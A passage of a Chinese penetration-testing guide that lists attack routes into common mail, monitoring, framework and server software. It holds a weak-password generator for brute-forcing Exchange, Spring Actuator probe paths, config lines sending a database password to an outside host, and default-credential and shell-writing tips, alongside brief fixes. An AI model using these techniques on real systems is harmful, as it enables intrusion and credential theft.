</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mail.domain.com
</span></span><span class="line"><span class="cl">mail1.domain.com
</span></span><span class="line"><span class="cl">mail-hk.domain.com
</span></span><span class="line"><span class="cl">owa.domain.com
</span></span><span class="line"><span class="cl">exchange.domain.com
</span></span><span class="line"><span class="cl">email.domain.com
</span></span><span class="line"><span class="cl">outlook.domain.com
</span></span></code></pre></td></tr></table>
</div>
</div><p>还有个很好用的域名, 这是outlook的自动发现域名</p>
<p><code>autodiscover.domain.com</code></p>
<p>2.爆破Exchange</p>
<p>这里两个漏洞都需要登录, 其实这个的弱口令不是很难找, 经常会成为企业的突破口</p>
<p>通常这里的密码能横穿内网, 比如 VPN, OA, SSO</p>
<p><code>Exchange</code>通常有以下几个接口</p>
<p><code>/owa</code> 前台web登录, 一般可以爆破</p>
<p><code>/ews</code> 这里是ews的接口, 可以进行401认证爆破, 只需要(域)账号和密码, 不需要知道域名前缀, 更方便爆破</p>
<p><code>/autodiscover/autodiscover.xml</code> 自动发现接口, 同ews爆破</p>
<p>3.爆破工具可使用 <code>owa</code>用<code>burp</code>, <code>ews</code>用<code>ruler</code>, <code>awvs</code>(比较好用)</p>
<p>sensepost/ruler: A tool to abuse Exchange services
<a class="link" href="https://github.com/sensepost/ruler"  target="_blank" rel="noopener"
    >https://github.com/sensepost/ruler</a></p>
<p>4.弱口令爆破技巧, 爆破<code>Exchange</code>相对比较好用, 直接生成企业特色弱口令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import itertools
</span></span><span class="line"><span class="cl">prefix = [&#39;baidu&#39;, &#39;Baidu&#39;]
</span></span><span class="line"><span class="cl">for x in [&#39;&#39;.join(x) for x in list(itertools.product(prefix, [&#39;@&#39;, &#39;&#39;], [&#39;2019&#39;, &#39;2020&#39;, &#39;2018&#39;, &#39;123&#39;, &#39;1234&#39;, &#39;123456&#39;], [&#39;!&#39;, &#39;&#39;, &#39;.&#39;]))] : print(x)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">baidu@2019!
</span></span><span class="line"><span class="cl">baidu@2019
</span></span><span class="line"><span class="cl">baidu@2019.
</span></span><span class="line"><span class="cl">baidu@2020!
</span></span><span class="line"><span class="cl">baidu@2020
</span></span><span class="line"><span class="cl">.........
</span></span><span class="line"><span class="cl">Baidu123456
</span></span><span class="line"><span class="cl">Baidu123456.
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<p>3.做好权限控制</p>
<h2 id="coremail-相关漏洞">Coremail 相关漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Coremail 是国内使用量很大的邮件服务商, 包括网易邮箱的后端使用的也是coremail</p>
<p><strong>2. 影响组件</strong>
Coremail</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Coremail</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Coremail&quot;</code></p>
<p><strong>5. 漏洞分析</strong>
Coremail-0day敏感文件泄露漏洞送附批量检测脚本_数据库_god_Zeo的博客-CSDN博客
<a class="link" href="https://blog.csdn.net/god_zzZ/article/details/92735189"  target="_blank" rel="noopener"
    >https://blog.csdn.net/god_zzZ/article/details/92735189</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>yuxiaoyou123/coremail-exp
<a class="link" href="https://github.com/yuxiaoyou123/coremail-exp"  target="_blank" rel="noopener"
    >https://github.com/yuxiaoyou123/coremail-exp</a></p>
<p>dpu/coremail-address-book: Coremail邮件系统组织通讯录导出脚本
<a class="link" href="https://github.com/dpu/coremail-address-book"  target="_blank" rel="noopener"
    >https://github.com/dpu/coremail-address-book</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个找不到源码, 没法分析</p>
<p>里面的密码也多半没啥用, 还不如邮件里搜索一下vpn/密码</p>
<p>2.这个东西有几率收到ImageMagick影响(此处存疑, 我只在dnslog见过, 没有实锤)</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="winmail-相关漏洞">Winmail 相关漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Winmail 是国内使用量较大的邮件服务商, 由于版本老旧, 有一些历史漏洞, 注入, 任意文件下载, 上传</p>
<p><strong>2. 影响组件</strong>
Winmail</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Winmail</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Winmail-Server&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.org
<a class="link" href="http://www.91ri.org/16519.html"  target="_blank" rel="noopener"
    >http://www.91ri.org/16519.html</a></p>
<p>winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术
<a class="link" href="http://www.hackdig.com/06/hack-36899.htm"  target="_blank" rel="noopener"
    >http://www.hackdig.com/06/hack-36899.htm</a></p>
<p>Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.org
<a class="link" href="https://php.mengsec.com/bugs/wooyun-2014-057890.html"  target="_blank" rel="noopener"
    >https://php.mengsec.com/bugs/wooyun-2014-057890.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.org
<a class="link" href="http://www.91ri.org/16519.html"  target="_blank" rel="noopener"
    >http://www.91ri.org/16519.html</a></p>
<p>winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术
<a class="link" href="http://www.hackdig.com/06/hack-36899.htm"  target="_blank" rel="noopener"
    >http://www.hackdig.com/06/hack-36899.htm</a></p>
<p>Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.org
<a class="link" href="https://php.mengsec.com/bugs/wooyun-2014-057890.html"  target="_blank" rel="noopener"
    >https://php.mengsec.com/bugs/wooyun-2014-057890.html</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个邮箱很多高校在用, 通过分析补丁, 一些老版本没升级的话还是有问题, 最新版是6.5</p>
<p>2.邮件系列老洞</p>
<p>高屋建瓴之WebMail攻与防 – cyjay5un – 博客园
<a class="link" href="https://www.cnblogs.com/cyjaysun/p/4378907.html"  target="_blank" rel="noopener"
    >https://www.cnblogs.com/cyjaysun/p/4378907.html</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="zabbix-相关漏洞">Zabbix 相关漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Zabbix 由于监控着内网众多主机, 所以也是内网关注的重点, 主要是注入/弱口令/命令执行</p>
<p><strong>2. 影响组件</strong></p>
<p>Zabbix</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Zabbix</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Zabbix&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>记一次zabbix安装及漏洞利用getshell全过程 – 先知社区
<a class="link" href="https://xz.aliyun.com/t/6874"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/6874</a></p>
<p>Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang
<a class="link" href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/"  target="_blank" rel="noopener"
    >https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>记一次zabbix安装及漏洞利用getshell全过程 – 先知社区
<a class="link" href="https://xz.aliyun.com/t/6874"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/6874</a></p>
<p>Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang
<a class="link" href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/"  target="_blank" rel="noopener"
    >https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这里如果 Zabbix 附近遇到 Grafana, 一般都是默认口令 admin/admin, 进后台查看数据源的位置, 如果有 Zabbix , 直接 f12 查看密码, 就可以登录 Zabbix 了</p>
<p>2.另外 Grafana 后台sql查询处可以执行任意 sql, 其他数据源也一样见机行事</p>
<p><strong>8. 防护方法</strong></p>
<p>1.设置强口令</p>
<p>2.尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<p>4.升级到最新版</p>
<h2 id="边界产品防火墙-网关-路由器-vpn-相关漏洞">边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>大型企业往往会配置一些边界设备来维护企业内外网通信, 这里也存在灯下黑的问题, 由于多数不开源, 漏洞主要以弱口令为主</p>
<p><strong>2. 影响组件</strong></p>
<p>防火墙, 网关, 路由器, VPN</p>
<p><strong>3. 漏洞指纹</strong></p>
<p>防火墙, 网关, 路由器, VPN</p>
<p><strong>4. Fofa Dork</strong>
防火墙, 网关, 路由器, VPN 的名称</p>
<p><strong>5. 漏洞分析</strong></p>
<p>【安全设备】常见网络安全设备默认口令|IT2021.Com
<a class="link" href="https://www.it2021.com/security/614.html"  target="_blank" rel="noopener"
    >https://www.it2021.com/security/614.html</a></p>
<p>渗透测试之各厂商防火墙登录IP、初始密码、技术支持
<a class="link" href="https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA"  target="_blank" rel="noopener"
    >https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>【安全设备】常见网络安全设备默认口令|IT2021.Com
<a class="link" href="https://www.it2021.com/security/614.html"  target="_blank" rel="noopener"
    >https://www.it2021.com/security/614.html</a></p>
<p>渗透测试之各厂商防火墙登录IP、初始密码、技术支持
<a class="link" href="https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA"  target="_blank" rel="noopener"
    >https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个东西好多人不改默认口令, 就算改很多也是企业特色弱口令</p>
<p><code>admin</code> <code>root</code> <code>123456</code> 永远的神</p>
<p>内网的安全平台就是个漏洞指南</p>
<p><strong>8. 防护方法</strong></p>
<p>1.设置强口令</p>
<p>2.限制来源IP</p>
<h2 id="第三节">第三节</h2>
<blockquote>
<p>本节主要是针对一些常见组件和中间件的相关漏洞(大部分是要结合环境利用), 这里肯定篇幅有限, 难免有所遗漏, 欢迎补充</p>
</blockquote>
<h2 id="thinkphp-相关漏洞">Thinkphp 相关漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Thinkphp 是国内很常见的PHP框架, 存在 远程代码执行/sql注入/反序列化/日志文件泄露等问题</p>
<p><strong>2. 影响组件</strong>
Thinkphp</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Thinkphp</code></p>
<p><code>X-Powered-By: ThinkPHP</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;ThinkPHP&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>ThinkPHP漏洞总结 – 赛克社区
<a class="link" href="http://zone.secevery.com/article/1165"  target="_blank" rel="noopener"
    >http://zone.secevery.com/article/1165</a></p>
<p>挖掘暗藏ThinkPHP中的反序列利用链 – 斗象能力中心
<a class="link" href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/"  target="_blank" rel="noopener"
    >https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/</a></p>
<p>ThinkPHP使用不当可能造成敏感信息泄露<em>PHP_Fly</em>鹏程万里-CSDN博客
<a class="link" href="https://blog.csdn.net/Fly_hps/article/details/81201904"  target="_blank" rel="noopener"
    >https://blog.csdn.net/Fly_hps/article/details/81201904</a></p>
<p>DSMall代码审计 – 安全客，安全资讯平台
<a class="link" href="https://www.anquanke.com/post/id/203461"  target="_blank" rel="noopener"
    >https://www.anquanke.com/post/id/203461</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>SkyBlueEternal/thinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合
<a class="link" href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection"  target="_blank" rel="noopener"
    >https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p>
<p>Dido1960/thinkphp: thinkphp反序列化漏洞复现及POC编写
<a class="link" href="https://github.com/Dido1960/thinkphp"  target="_blank" rel="noopener"
    >https://github.com/Dido1960/thinkphp</a></p>
<p>whirlwind110/tphack: Thinkphp3/5 Log文件泄漏利用工具
<a class="link" href="https://github.com/whirlwind110/tphack"  target="_blank" rel="noopener"
    >https://github.com/whirlwind110/tphack</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.遇到Thinkphp的站点看一下版本, 或者直接扫一下, 看看有没有rce, 或者日志文件泄露</p>
<p>2.自从我挖了thinphp的反序列化利用链以后, 这类型考题经常出没在ctf中</p>
<p>3.实战中也看到偶尔有可以利用的情况, 运气好可能有惊喜, 刚好有篇新出的文章中使用到了这个漏洞</p>
<p>DSMall代码审计 – 安全客，安全资讯平台
<a class="link" href="https://www.anquanke.com/post/id/203461"  target="_blank" rel="noopener"
    >https://www.anquanke.com/post/id/203461</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版Thinkphp</p>
<p>3.前置WAF进行防护</p>
<h2 id="spring-系列漏洞">Spring 系列漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Spring 是java web里最最最最常见的组件了, 自然也是研究的热门, 好用的漏洞主要是Spring Boot Actuators 反序列化, 火起来之前用了一两年, 效果很棒</p>
<p><strong>2. 影响组件</strong>
Spring xxx</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>X-Application-Context:</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Spring-Framework&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Spring 框架漏洞集合 ~ Misaki’s Blog
<a class="link" href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/"  target="_blank" rel="noopener"
    >https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</a></p>
<p>Exploiting Spring Boot Actuators | Veracode blog
<a class="link" href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators"  target="_blank" rel="noopener"
    >https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></p>
<p>Spring Boot Actuators配置不当导致RCE漏洞复现 – JF ‘ blog
<a class="link" href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"  target="_blank" rel="noopener"
    >https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>mpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCE
<a class="link" href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit"  target="_blank" rel="noopener"
    >https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a></p>
<p>artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads
<a class="link" href="https://github.com/artsploit/yaml-payload"  target="_blank" rel="noopener"
    >https://github.com/artsploit/yaml-payload</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.Spring Boot Actuators 相关漏洞超级好用</p>
<p>很多厂商一开始都不懂, 直接对外开放<code>Spring Boot Actuators</code>, 造成了有一段时间每个用了<code>Spring Boot</code>的厂商都出了问题</p>
<p>尤其是现在很多厂商使用微服务框架, 通过网关进行路由分发, 一些子目录通常对应一个<code>Spring Boot</code>启动的服务</p>
<p>然后子目录比如 <code>http://123.123.123.123/admin/env</code> , <code>http://123.123.123.123/manager/env</code>也都是可以出现的</p>
<p><code>/env</code> 可以偷session, RCE</p>
<p><code>/heapdump</code> 可以直接dump jvm中的对象, 使用 jhat 可以读取里面的对象</p>
<p>可以遍历如下的endpoint, 1.x 2.x的目录不一样, 所以都覆盖了一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/trace
</span></span><span class="line"><span class="cl">/health
</span></span><span class="line"><span class="cl">/loggers
</span></span><span class="line"><span class="cl">/metrics
</span></span><span class="line"><span class="cl">/autoconfig
</span></span><span class="line"><span class="cl">/heapdump
</span></span><span class="line"><span class="cl">/threaddump
</span></span><span class="line"><span class="cl">/env
</span></span><span class="line"><span class="cl">/info
</span></span><span class="line"><span class="cl">/dump
</span></span><span class="line"><span class="cl">/configprops
</span></span><span class="line"><span class="cl">/mappings
</span></span><span class="line"><span class="cl">/auditevents
</span></span><span class="line"><span class="cl">/beans
</span></span><span class="line"><span class="cl">/jolokia
</span></span><span class="line"><span class="cl">/cloudfoundryapplication
</span></span><span class="line"><span class="cl">/hystrix.stream
</span></span><span class="line"><span class="cl">/actuator
</span></span><span class="line"><span class="cl">/actuator/auditevents
</span></span><span class="line"><span class="cl">/actuator/beans
</span></span><span class="line"><span class="cl">/actuator/health
</span></span><span class="line"><span class="cl">/actuator/conditions
</span></span><span class="line"><span class="cl">/actuator/configprops
</span></span><span class="line"><span class="cl">/actuator/env
</span></span><span class="line"><span class="cl">/actuator/info
</span></span><span class="line"><span class="cl">/actuator/loggers
</span></span><span class="line"><span class="cl">/actuator/heapdump
</span></span><span class="line"><span class="cl">/actuator/threaddump
</span></span><span class="line"><span class="cl">/actuator/metrics
</span></span><span class="line"><span class="cl">/actuator/scheduledtasks
</span></span><span class="line"><span class="cl">/actuator/httptrace
</span></span><span class="line"><span class="cl">/actuator/mappings
</span></span><span class="line"><span class="cl">/actuator/jolokia
</span></span><span class="line"><span class="cl">/actuator/hystrix.stream
</span></span><span class="line"><span class="cl">/monitor
</span></span><span class="line"><span class="cl">/monitor/auditevents
</span></span><span class="line"><span class="cl">/monitor/beans
</span></span><span class="line"><span class="cl">/monitor/health
</span></span><span class="line"><span class="cl">/monitor/conditions
</span></span><span class="line"><span class="cl">/monitor/configprops
</span></span><span class="line"><span class="cl">/monitor/env
</span></span><span class="line"><span class="cl">/monitor/info
</span></span><span class="line"><span class="cl">/monitor/loggers
</span></span><span class="line"><span class="cl">/monitor/heapdump
</span></span><span class="line"><span class="cl">/monitor/threaddump
</span></span><span class="line"><span class="cl">/monitor/metrics
</span></span><span class="line"><span class="cl">/monitor/scheduledtasks
</span></span><span class="line"><span class="cl">/monitor/httptrace
</span></span><span class="line"><span class="cl">/monitor/mappings
</span></span><span class="line"><span class="cl">/monitor/jolokia
</span></span><span class="line"><span class="cl">/monitor/hystrix.stream
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里通过 <code>/env</code> + <code>/refresh</code> 进行rce应该还有其他利用手法, 当spring boot reload的时候会进行一些默认操作</p>
<p>里面就有操作空间, 很像fastjson反序列化</p>
<p>2.就算实在不能RCE, 这里也有个技巧可以偷取 Spring 配置文件中的加密字段, 偷一下生产环境的密码/key也ok</p>
<p>springboot Information Disclosure
<a class="link" href="https://gist.github.com/UUUUnotfound/fed628b074859997d6970717ddd7fbf3"  target="_blank" rel="noopener"
    >https://gist.github.com/UUUUnotfound/fed628b074859997d6970717ddd7fbf3</a></p>
<p><code>eureka.client.serviceUrl.defaultZone=http://${somedb.password}@127.0.0.1:5000</code></p>
<p><code>spring.cloud.bootstrap.location=http://${somedb.password}@artsploit.com/yaml-payload.yml</code></p>
<p>3.尤其是使用spring eureka做集群的时候, 通常拿到一台服务器, 就可以传递恶意注册到其他server, 从而感染整个微服务集群</p>
<p>eureka 通常是 server 也是 client, 无论对方请求什么都直接返回恶意序列化xml就可以了</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.开启Spring Boot Actuators权限校验</p>
<p>3.前置WAF进行防护</p>
<h2 id="phpstudy-后门远程代码执行">Phpstudy 后门远程代码执行</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Phpstudy 是一个国产的php快速集成环境, 主要用于学习测试, 但是也有很多人直接拿来部署服务器</p>
<p><strong>2. 影响组件</strong></p>
<p>Phpstudy</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>phpStudy 探针</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;phpStudy 探针&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>PhpStudy 后门分析
<a class="link" href="https://paper.seebug.org/1044/"  target="_blank" rel="noopener"
    >https://paper.seebug.org/1044/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>NS-Sp4ce/PHPStudy_BackDoor_Exp: PHPStudy_BackDoor_EXP PHPstudy后门利用脚本
<a class="link" href="https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp"  target="_blank" rel="noopener"
    >https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.phpstudy 根目录下面有个<code>l.php</code> , 里面有探针, 可以作为判断条件</p>
<p>2.还有个<code>/phpmyadmin</code>目录, 一般密码都是<code>root/root</code> 后台<code>mysql outfile</code> 写 shell 就ok了</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时删除phpstudy</p>
<p>2.升级到最新版</p>
<p>3.不要用phpstduy搭建生产环境</p>
<h2 id="struts-系列漏洞">Struts 系列漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Struts 真的是Java漏洞史上浓墨重彩的一笔, 堪称那些年的漏洞之王, 一直到现在还没有消失, 企业内网还是有不少存在</p>
<p><strong>2. 影响组件</strong>
Struts</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Struts</code></p>
<p><code>.action</code></p>
<p><code>.do</code></p>
<p><code>.action!xxxx</code></p>
<p>struts2_check/struts2_hunt_v2.py at master · coffeehb/struts2_check
<a class="link" href="https://github.com/coffeehb/struts2_check/"  target="_blank" rel="noopener"
    >https://github.com/coffeehb/struts2_check/</a></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Struts2&quot;</code> (这个不太准)</p>
<p><strong>5. 漏洞分析</strong></p>
<p>Struts2代码执行漏洞整理 – 简书
<a class="link" href="https://www.jianshu.com/p/d7cd8a2a992b"  target="_blank" rel="noopener"
    >https://www.jianshu.com/p/d7cd8a2a992b</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>struts-scan/struts-scan.py at master · Lucifer1993/struts-scan</p>
<p><a class="link" href="https://github.com/Lucifer1993/struts-scan/"  target="_blank" rel="noopener"
    >https://github.com/Lucifer1993/struts-scan/</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.Struts 的漏洞(比如016, 032)经常可以用于ssrf打内网, 说不好就有惊喜</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版</p>
<p>2.不建议使用Struts</p>
<h2 id="solr-系列漏洞">Solr 系列漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Solr 是企业常见的全文搜索服务, 这两年也爆出很多安全漏洞,</p>
<p><strong>2. 影响组件</strong></p>
<p>Solr</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Solr</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Solr&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Apache Solr最新RCE漏洞分析 – FreeBuf互联网安全新媒体平台
<a class="link" href="https://www.freebuf.com/vuls/218730.html"  target="_blank" rel="noopener"
    >https://www.freebuf.com/vuls/218730.html</a></p>
<p>Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析
<a class="link" href="https://paper.seebug.org/1009/"  target="_blank" rel="noopener"
    >https://paper.seebug.org/1009/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>veracode-research/solr-injection: Apache Solr Injection Research
<a class="link" href="https://github.com/veracode-research/solr-injection"  target="_blank" rel="noopener"
    >https://github.com/veracode-research/solr-injection</a></p>
<p>jas502n/CVE-2019-12409: Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS=”true”)
<a class="link" href="https://github.com/jas502n/CVE-2019-12409"  target="_blank" rel="noopener"
    >https://github.com/jas502n/CVE-2019-12409</a></p>
<p>mogwailabs/mjet: MOGWAI LABS JMX exploitation toolkit
<a class="link" href="https://github.com/mogwailabs/mjet"  target="_blank" rel="noopener"
    >https://github.com/mogwailabs/mjet</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.看到锤就完事了, 漏洞太多了, 一片一片的</p>
<p>2.遇到<code>mjet</code>连接超时, 这是目标服务起返回了错误的stub(内网地址, 常见于docker), 可以使用<code>socat</code>进行流量转发, 后记里面有具体操作</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版</p>
<p>2.不要对外开放敏感端口</p>
<h2 id="tomcat-本地文件包含漏洞-cve-2020-1938">Tomcat 本地文件包含漏洞 (CVE-2020-1938)</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Tomcat 是常见的Web 容器, 用户量非常巨大, Tomcat 8009 ajp端口一直是默认开放的, 这个漏洞存在很多年了, 这次应该有奇效</p>
<p><strong>2. 影响组件</strong></p>
<p>Apache Tomcat 6</p>
<p>Apache Tomcat 7 &lt; 7.0.100</p>
<p>Apache Tomcat 8 &lt; 8.5.51</p>
<p>Apache Tomcat 9 &lt; 9.0.31</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>tomcat</code></p>
<p><code>8009</code></p>
<p><code>ajp</code></p>
<p><code>\x04\x01\xf4\x00\x15</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>protocol=&quot;ajp&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Apache Tomcat AJP协议文件包含漏洞分析 – 斗象能力中心
<a class="link" href="https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/"  target="_blank" rel="noopener"
    >https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>0nise/CVE-2020-1938: CVE-2020-1938
<a class="link" href="https://github.com/0nise/CVE-2020-1938"  target="_blank" rel="noopener"
    >https://github.com/0nise/CVE-2020-1938</a></p>
<p><strong>7. 利用技巧</strong></p>
